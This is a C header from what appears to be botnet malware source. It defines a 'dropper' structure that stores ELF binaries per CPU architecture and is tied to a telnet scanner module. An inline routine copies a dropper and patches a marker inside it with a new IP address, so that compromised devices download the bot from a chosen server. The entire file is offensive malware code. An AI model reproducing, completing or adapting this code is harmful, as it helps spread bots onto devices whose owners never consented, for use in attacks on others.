#ifndef DOWNLOADER_H
#define DOWNLOADER_H

#include <elf.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include "bot/definitions.h"
#include "bot/modules/scanner/telnet_scanner.h"
#include "bot/utils/string.h"

/* the dropper structure */
typedef struct {
  uint16_t machine;
  uint8_t endianess;
  int type;

  uint16_t len;
  char *data;
} binary_t, *pbinary_t;

// list of binaries, and the binary count
extern binary_t *binaries;
extern size_t binaries_count;

void downloader_init();
void downloader_add(uint16_t, uint8_t, int, const char *, uint16_t);
pbinary_t downloader_retrieve(scanner_elf_t *);

// we do want this inlined, so
static inline char *downloader_replace(scanner_elf_t *elf, uint32_t replacement_ip, int *len) {
  binary_t *original = downloader_retrieve(elf);
  if (!original) {
    return NULL;
  }

  // copy data
  char *new_dup = malloc(original->len);
  memcpy(new_dup, original->data, original->len);

  int pos = str_search(new_dup, "oooo", original->len, 4);
  if (pos == -1) {
    LOG_ERROR("Finding 'oooo' failed. Bailing!");
    free(new_dup);
    return NULL;
  }

  pos -= sizeof(uint32_t);
  memcpy(new_dup + pos, &replacement_ip, sizeof(uint32_t));

  if (len) *len = original->len;
  return new_dup;
}

#endif
